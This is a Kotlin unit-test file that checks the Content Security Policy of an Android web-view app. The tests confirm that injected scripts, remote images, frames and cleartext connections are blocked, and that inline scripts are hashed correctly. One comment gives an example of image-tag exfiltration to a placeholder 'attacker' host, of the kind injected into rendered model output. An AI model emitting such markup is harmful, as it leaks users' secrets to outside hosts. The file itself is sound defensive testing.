package ai.opencode.android.web

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

/**
 * The policy that stands between injected markup and the bridge.
 *
 * Robolectric only because the hash is written with `android.util.Base64`; the
 * logic under test is pure.
 */
@RunWith(RobolectricTestRunner::class)
class ContentSecurityPolicyTest {

    private fun directive(policy: String, name: String): String =
        policy.split("; ").first { it.startsWith("$name ") || it == name }

    // ---- the directives that carry the security value ------------------------

    @Test
    fun scriptSourcesAreSelfAndNamedHashesOnly() {
        val policy = ContentSecurityPolicy.forDocument(listOf("'sha256-abc'"))
        val scripts = directive(policy, "script-src")

        assertTrue(scripts.contains("'self'"))
        assertTrue("the document's own inline script must be named", scripts.contains("'sha256-abc'"))
        assertFalse(
            "'unsafe-inline' would readmit every injected <script> this exists to stop",
            scripts.contains("'unsafe-inline'"),
        )
        assertFalse("'unsafe-eval' turns any injected string into code", scripts.contains("'unsafe-eval'"))
    }

    @Test
    fun wasmIsPermittedWithoutPermittingEval() {
        val scripts = directive(ContentSecurityPolicy.forDocument(emptyList()), "script-src")
        assertTrue(scripts.contains("'wasm-unsafe-eval'"))
        // A substring check would pass on 'wasm-unsafe-eval' alone, so match the
        // token rather than the text.
        assertFalse(scripts.split(" ").contains("'unsafe-eval'"))
    }

    @Test
    fun imagesMayNotBeLoadedFromRemoteHosts() {
        // The cheapest exfiltration channel in a UI that renders model output:
        // <img src="https://attacker/?secret">. Blocking it costs a broken image.
        val images = directive(ContentSecurityPolicy.forDocument(emptyList()), "img-src")
        assertEquals("img-src 'self' data: blob:", images)
        assertFalse(images.contains("https:"))
        assertFalse(images.contains("*"))
    }

    @Test
    fun theLoopbackServerIsReachableOnAnyPort() {
        // The on-device server's port is ephemeral, so it cannot be named.
        val connect = directive(ContentSecurityPolicy.forDocument(emptyList()), "connect-src")
        assertTrue(connect.contains("http://127.0.0.1:*"))
        assertTrue(connect.contains("http://localhost:*"))
    }

    @Test
    fun connectSrcDoesNotPermitArbitraryCleartext() {
        // The documented weakness is `https:` for remote-server mode. Plain http
        // to anywhere is not part of that bargain.
        val connect = directive(ContentSecurityPolicy.forDocument(emptyList()), "connect-src")
        assertFalse("http: would allow cleartext to any host", connect.split(" ").contains("http:"))
        assertFalse(connect.split(" ").contains("*"))
    }

    @Test
    fun theDangerousDefaultsAreClosed() {
        val policy = ContentSecurityPolicy.forDocument(emptyList())
        assertEquals("default-src 'self'", directive(policy, "default-src"))
        assertEquals("object-src 'none'", directive(policy, "object-src"))
        assertEquals("frame-src 'none'", directive(policy, "frame-src"))
        // base-uri would otherwise let injected markup re-point every relative
        // URL in the document, including the bundle.
        assertEquals("base-uri 'none'", directive(policy, "base-uri"))
        assertEquals("form-action 'none'", directive(policy, "form-action"))
        assertEquals("frame-ancestors 'none'", directive(policy, "frame-ancestors"))
    }

    // ---- hashing the document's own scripts ---------------------------------

    @Test
    fun anInlineScriptIsHashedAndAnExternalOneIsNot() {
        val html = """
            <html><head>
            <script id="preload">var a = 1</script>
            <script type="module" crossorigin src="/assets/index.js"></script>
            </head></html>
        """.trimIndent()

        val hashes = ContentSecurityPolicy.inlineScriptHashes(html)
        assertEquals("only the inline script is hashed; 'self' covers the other", 1, hashes.size)
        assertTrue(hashes.single().startsWith("'sha256-"))
        assertTrue(hashes.single().endsWith("'"))
    }

    @Test
    fun twoInlineScriptsAreTwoHashes() {
        // A greedy matcher would swallow the gap between them and produce one
        // wrong hash, which would fail closed and block the app's own code.
        val html = "<script>one()</script><div>x</div><script>two()</script>"
        val hashes = ContentSecurityPolicy.inlineScriptHashes(html)

        assertEquals(2, hashes.size)
        assertEquals("different bodies must not hash alike", 2, hashes.distinct().size)
    }

    @Test
    fun theHashCoversTheScriptBodyExactly() {
        // CSP hashes the bytes between the tags, with no trimming. Getting this
        // wrong produces a policy that looks right and blocks the script.
        val body = "\n  var key = \"opencode-theme-id\"\n"
        val hashes = ContentSecurityPolicy.inlineScriptHashes("<script id=\"x\">$body</script>")

        val expected = java.security.MessageDigest.getInstance("SHA-256")
            .digest(body.toByteArray(Charsets.UTF_8))
        val encoded = android.util.Base64.encodeToString(expected, android.util.Base64.NO_WRAP)

        assertEquals("'sha256-$encoded'", hashes.single())
    }

    @Test
    fun aDocumentWithNoInlineScriptsProducesNoHashes() {
        assertEquals(emptyList<String>(), ContentSecurityPolicy.inlineScriptHashes("<html><body>hi</body></html>"))
    }

    @Test
    fun theRealPackagedDocumentYieldsAHash() {
        // Guards the case that actually breaks the app: upstream changes the
        // preload script's markup and the matcher stops finding it, so the policy
        // ships without its hash and the app loads to a blank screen.
        val html = java.io.File("src/main/assets/web/index.html")
        if (!html.exists()) return // a build without the bundle staged is legitimate

        val hashes = ContentSecurityPolicy.inlineScriptHashes(html.readText())
        assertTrue("the packaged index.html has an inline theme preload to hash", hashes.isNotEmpty())
    }
}
